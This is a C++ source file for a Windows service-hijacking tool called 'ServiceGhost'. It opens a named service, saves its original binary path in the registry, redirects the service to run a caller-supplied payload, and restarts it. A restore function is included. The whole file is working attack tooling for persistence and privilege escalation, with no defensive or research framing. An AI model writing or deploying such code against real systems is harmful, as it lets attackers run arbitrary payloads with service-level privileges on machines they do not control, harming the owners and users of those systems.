#include <Windows.h>
#include <iostream>
#include <winsvc.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

class ServiceGhost {
public:
    bool hijack_service(const wchar_t* serviceName, const wchar_t* payloadPath) {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scm) return false;
        
        SC_HANDLE service = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
        if (!service) {
            CloseServiceHandle(scm);
            return false;
        }
        
        // Backup original service binary
        if (!backup_original(service)) {
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return false;
        }
        
        // Change service binary path
        if (!ChangeServiceConfigW(
            service,
            SERVICE_NO_CHANGE,
            SERVICE_NO_CHANGE,
            SERVICE_NO_CHANGE,
            payloadPath,
            nullptr,
            nullptr,
            nullptr,
            nullptr,
            nullptr,
            nullptr
        )) {
            restore_original(service);
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return false;
        }
        
        // Restart service
        SERVICE_STATUS status;
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        Sleep(2000);
        StartServiceW(service, 0, nullptr);
        
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return true;
    }

    bool restore_service(const wchar_t* serviceName) {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scm) return false;
        
        SC_HANDLE service = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
        if (!service) {
            CloseServiceHandle(scm);
            return false;
        }
        
        bool success = restore_original(service);
        if (success) {
            SERVICE_STATUS status;
            ControlService(service, SERVICE_CONTROL_STOP, &status);
            Sleep(2000);
            StartServiceW(service, 0, nullptr);
        }
        
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return success;
    }

private:
    bool backup_original(SC_HANDLE service) {
        wchar_t originalPath[MAX_PATH];
        DWORD bufSize = sizeof(originalPath);
        
        if (!QueryServiceConfigW(
            service,
            nullptr,
            0,
            &bufSize
        ) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            return false;
        }
        
        LPQUERY_SERVICE_CONFIGW config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(LPTR, bufSize);
        if (!config) return false;
        
        BOOL success = QueryServiceConfigW(
            service,
            config,
            bufSize,
            &bufSize
        );
        
        if (success) {
            wcscpy_s(originalPath, config->lpBinaryPathName);
            backupRegistry(service, originalPath);
        }
        
        LocalFree(config);
        return success;
    }

    void backupRegistry(SC_HANDLE service, const wchar_t* path) {
        HKEY hKey;
        if (RegCreateKeyExW(
            HKEY_CURRENT_USER,
            L"Software\\ServiceBackups",
            0,
            nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        ) == ERROR_SUCCESS) {
            RegSetValueExW(
                hKey,
                L"OriginalServicePath",
                0,
                REG_SZ,
                (const BYTE*)path,
                (wcslen(path) + 1) * sizeof(wchar_t)
            );
            RegCloseKey(hKey);
        }
    }

    bool restore_original(SC_HANDLE service) {
        wchar_t originalPath[MAX_PATH];
        DWORD size = sizeof(originalPath);
        
        HKEY hKey;
        if (RegOpenKeyExW(
            HKEY_CURRENT_USER,
            L"Software\\ServiceBackups",
            0,
            KEY_READ,
            &hKey
        ) == ERROR_SUCCESS) {
            if (RegQueryValueExW(
                hKey,
                L"OriginalServicePath",
                nullptr,
                nullptr,
                (LPBYTE)originalPath,
                &size
            ) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return ChangeServiceConfigW(
                    service,
                    SERVICE_NO_CHANGE,
                    SERVICE_NO_CHANGE,
                    SERVICE_NO_CHANGE,
                    originalPath,
                    nullptr,
                    nullptr,
                    nullptr,
                    nullptr,
                    nullptr,
                    nullptr
                ) != 0;
            }
            RegCloseKey(hKey);
        }
        return false;
    }
};